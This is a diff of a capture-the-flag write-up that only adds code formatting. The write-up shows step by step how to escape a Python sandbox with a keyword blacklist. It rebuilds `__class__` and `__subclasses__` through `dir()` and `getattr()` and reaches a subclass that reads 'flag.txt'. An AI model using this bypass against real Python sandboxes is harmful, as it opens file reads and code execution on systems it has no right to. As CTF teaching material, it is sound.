@@ -66,15 +66,15 @@ Usually the flag is hidden on the server in a .txt file, so our goal is to read 
 
 `().__class__.__base__.__subclasses__()[40]("flag.txt").read()`
 
-Here is the line we want to execute, but from the reco phase we know that class, subclasses is blacklisted.
-To circumvent this we need to figure out another way to run __class__ and __subclasses__ without actually typing it.
+Here is the line we want to execute, but from the reco phase we know that `__class__` and `__subclasses__` is blacklisted.
+To circumvent this we need to figure out another way to run `__class__` and `__subclasses__`  without actually typing it.
 
 ```
 >>> dir([])[1]
 '__class__'
 ```
 
-Okay, we can now write the __class__ without directly typing it to bypass the blacklist.
+Okay, we can now write the `__class__` without directly typing it to bypass the blacklist.
 
 ```
 >>> getattr((), dir([])[1])
@@ -82,19 +82,19 @@ Okay, we can now write the __class__ without directly typing it to bypass the bl
 ```
 This translates to `[].__class__`.
 
-Okay so next we want to append __base__.
+Okay so next we want to append `__base__`.
 
 ```
 >>> getattr((), dir([])[1]).__base__
 <type 'object'>
 ```
-And now we want to append __subclassses__, but we know class is blacklisted so we have to bypass it somehow.
+And now we want to append `__subclassses__`, but we know class is blacklisted so we have to bypass it somehow.
 
 ```
 >>> dir(().__class__.__base__.__class__)
 ['__abstractmethods__', '__base__', '__bases__', '__basicsize__', '__call__', '__class__', '__delattr__', '__dict__', '__dictoffset__', '__doc__', '__eq__', '__flags__', '__format__', '__ge__', '__getattribute__', '__gt__', '__hash__', '__init__', '__instancecheck__', '__itemsize__', '__le__', '__lt__', '__module__', '__mro__', '__name__', '__ne__', '__new__', '__reduce__', '__reduce_ex__', '__repr__', '__setattr__', '__sizeof__', '__str__', '__subclasscheck__', '__subclasses__', '__subclasshook__', '__weakrefoffset__', 'mro']
 ```
-We've found the __subclasses__. Now we just have to write the same command without using class.
+We've found the `__subclasses__`. Now we just have to write the same command without using class.
 
 ```
 >>> dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))
@@ -113,7 +113,7 @@ getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr(
 <built-in method __subclasses__ of type object at 0x5610a5dd6980>
 ```
 
-Adding () to call the __subclasses__ function.
+Adding () to call the `__subclasses__` function.
 
 ```
 >>> getattr(getattr(getattr((), dir([])[1]),'__base__'),dir(getattr(getattr(getattr((), dir([])[1]),'__base__'),  dir([])[1]))[34])()
